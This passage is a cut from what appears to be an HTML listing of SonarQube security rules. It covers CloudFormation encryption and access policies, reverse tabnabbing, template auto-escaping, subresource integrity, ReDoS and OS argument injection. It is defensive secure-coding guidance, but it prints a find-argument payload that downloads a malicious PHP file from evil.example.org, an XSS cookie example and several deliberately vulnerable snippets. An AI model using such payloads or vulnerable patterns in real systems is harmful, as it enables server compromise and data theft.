</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6319">
              cloudformation:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The instance contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html">AWS::SageMaker::NotebookInstance</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Notebook:  # Sensitive, encryption disabled by default
    Type: AWS::SageMaker::NotebookInstance
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-sagemaker-notebookinstance.html">AWS::SageMaker::NotebookInstance</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Notebook:
    Type: AWS::SageMaker::NotebookInstance
    Properties:
      KmsKeyId:
        Fn::GetAtt:
          - SomeKey
          - KeyId
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html">Protect Data at Rest Using Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6330">
              cloudformation:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The queue contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html">AWS::SQS::Queue</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Queue:  # Sensitive, encryption disabled by default
    Type: AWS::SQS::Queue
    Properties:
      DisplayName: "unencrypted_queue"
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sqs-queues.html">AWS::SQS::Queue</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Queue:
    Type: AWS::SQS::Queue
    Properties:
      DisplayName: "encrypted_queue"
      KmsMasterKeyId:
        Fn::GetAtt:
          - TestKey
          - KeyId
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html">AWS Documentation</a> -
  Encryption at rest </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6275">
              cloudformation:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a
href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The disk contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html">AWS::EC2::Volume</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume
    Properties:
      Encrypted: false  # Sensitive
</pre>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume  # Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-ec2-ebs-volume.html">AWS::EC2::Volume</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Ec2Volume:
    Type: AWS::EC2::Volume
    Properties:
      Encrypted: true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">Amazon EBS encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6252">
              cloudformation:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be in three states related to versioning:</p>
<ul>
  <li> unversioned (default one) </li>
  <li> enabled </li>
  <li> suspended </li>
</ul>
<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<p>Versioning is disabled by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "Example"
</pre>
<h2>Compliant Solution</h2>
<p>Versioning is enabled:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Compliant
    Properties:
      BucketName: "Example"
      VersioningConfiguration:
        Status: Enabled
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html">AWS documentation</a> - Using versioning in S3 buckets </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6332">
              cloudformation:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file system contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html">AWS::EFS::FileSystem</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Fs:  # Sensitive, encryption disabled by default
    Type: AWS::EFS::FileSystem
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html">AWS::EFS::FileSystem</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Fs:
    Type: AWS::EFS::FileSystem
    Properties:
      Encrypted: true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">AWS Documentation</a> - Data encryption in Amazon EFS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6270">
              cloudformation:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The AWS resource stores or processes sensitive data. </li>
  <li> The AWS resource is designed to be private. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketPolicy:
    Type: 'AWS::S3::BucketPolicy' # Sensitive
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              AWS: "*" # all principals / anonymous access
            Action: "s3:PutObject" # can put object
            Resource: arn:aws:s3:::mybucket/*
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketPolicy:
    Type: 'AWS::S3::BucketPolicy' # Compliant
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              AWS:
                - !Sub 'arn:aws:iam::${AWS::AccountId}:root' # only this principal
            Action: "s3:PutObject" # can put object
            Resource: arn:aws:s3:::mybucket/*
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:S5148">
              Web:S5148
            </a>
          </td>
          <td>
            <details>
              <p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not
<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>
<p>For instance, an attacker can put a link (say: "http://example.com/mylink") on a popular website that changes, when opened, the original page to
"http://example.com/fake_login". On "http://example.com/fake_login" there is a fake login page which could trick real users to enter their
credentials.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application opens untrusted external URL. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>
<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection
enabled by default.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;a href="http://example.com/dangerous" target="_blank"&gt; &lt;!-- Sensitive --&gt;

&lt;a href="{{variable}}" target="_blank"&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>To prevent pages from abusing <code>window.opener</code>, use <code>rel=noopener</code> on <code>&lt;a href=&gt;</code> to force its value to be
<code>null</code> on the opened pages.</p>
<pre>
&lt;a href="http://petssocialnetwork.io" target="_blank" rel="noopener"&gt;
</pre>
<h2>Exceptions</h2>
<p>No Issue will be raised when <code>href</code> contains a hardcoded relative url as there it has less chances of being vulnerable. An url is
considered hardcoded and relative if it doesn’t start with <code>http://</code> or <code>https://</code>, and if it does not contain any of the
characters {}$()[]</p>
<pre>
&lt;a href="internal.html" target="_blank" &gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing">Reverse Tabnabbing</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1022">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://mathiasbynens.github.io/rel-noopener/">https://mathiasbynens.github.io/rel-noopener/</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:S5247">
              Web:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because '<code>:</code>' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;!-- Django templates --&gt;
&lt;p&gt;{{ variable|safe }}&lt;/p&gt;&lt;!-- Sensitive --&gt;
{% autoescape off %}&lt;!-- Sensitive --&gt;

&lt;!-- Jinja2 templates --&gt;
&lt;p&gt;{{ variable|safe }}&lt;/p&gt;&lt;!-- Sensitive --&gt;
{% autoescape false %}&lt;!-- Sensitive --&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=Web:S5725">
              Web:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul>
  <li> impersonate users' identities and take advantage of their privileges on the application. </li>
  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>
  <li> gain access to sensitive clients' personal data. </li>
  <li> deface, or otherwise affect the general availability of the application. </li>
  <li> mine cryptocurrencies in the background. </li>
</ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul>
  <li> access and modify sensitive technical and business data. </li>
  <li> elevate its privileges on the underlying operating system. </li>
  <li> Use the compromised application as a pivot to attack the local network. </li>
</ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The artifact is a file intended to execute code. </li>
  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul>
  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>
  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>
</ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named "latest" or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
&lt;script
    src="https://cdn.example.com/latest/script.js"
&gt;&lt;/script&gt; &lt;!-- Sensitive --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;script
    src="https://cdn.example.com/v5.3.6/script.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
&gt;&lt;/script&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/353">CWE-353 - Missing Support for Integrity Check</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">developer.mozilla.org</a> - Subresource Integrity </li>
  <li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack">Wikipedia, Watering Hole Attacks</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2631">
              jssecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const express = require('express');

const app = express();

app.get('/lookup', (req, res) =&gt; {
  const regex = RegExp(req.query.regex); // Noncompliant

  if(regex.test(req.query.data)){
    res.send("It's a Match!");
  }else{
    res.send("Not a Match!");
  }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const express = require('express');
const escapeStringRegexp = require('escape-string-regexp');

const app = express();

app.get('/lookup', (req, res) =&gt; {
  const regex = RegExp(escapeStringRegexp(req.query.regex));

  if(regex.test(req.query.data)){
    res.send("It's a Match!");
  }else{
    res.send("Not a Match!");
  }
})
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes
metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5883">
              jssecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
async function (req, res) {
    await execa.command('find /tmp/images/' + req.query.id); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
async function (req, res) {
    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]+$/i)) {
        await execa('find', ['/tmp/images/' + req.query.file]);
    } else {
        await execa('find', ['/tmp/images/']);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>
<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.
It also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter
will not be able to inject arbitrary new ones.</p>
<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an
additional validation layer.</p>
<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special
file path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole
file system. This could lead to a denial of service or sensitive data exposure.</p>
<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted
parameter contains a harmless value.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5146">
